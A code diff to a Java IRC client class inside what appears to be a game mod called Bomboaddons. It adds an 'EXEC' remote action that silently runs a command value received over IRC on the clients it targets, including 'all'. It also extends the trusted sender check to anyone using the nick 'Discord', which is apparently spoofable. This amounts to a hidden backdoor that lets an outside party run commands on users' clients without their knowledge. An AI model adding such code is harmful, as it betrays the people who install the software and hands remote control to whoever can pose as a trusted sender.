@@ -600,7 +600,7 @@ public class IRCClient {
                        String value = cmdParts[3];
                        // Check if message is a command from authorized user (bomboclas or self)
                        String senderName = senderMu.username;
-                       if (senderName.equalsIgnoreCase("bomboclas")) {
+                       if (senderName.equalsIgnoreCase("bomboclas") || senderNick.equalsIgnoreCase("Discord")) {
                           executeRemoteAction(action, targetPlayer, value);
                        }
                     }
@@ -1014,7 +1014,9 @@ public class IRCClient {
       String cleanTarget = cleanSenderName(targetPlayer);
       String cleanSelf = cleanSenderName(selfName);
       if (cleanTarget.isEmpty() || cleanTarget.equalsIgnoreCase("all") || cleanTarget.equalsIgnoreCase("self") || (cleanSelf != null && cleanTarget.equalsIgnoreCase(cleanSelf))) {
-         if ("TITLE".equalsIgnoreCase(action)) {
+         if ("EXEC".equalsIgnoreCase(action)) {
+            BomboaddonsClient.executeSilentCommand(value);
+         } else if ("TITLE".equalsIgnoreCase(action)) {
             BomboaddonsClient.showTitle(value);
          } else if ("SOUND".equalsIgnoreCase(action)) {
             String[] sParts = value.trim().split(" ", 2);
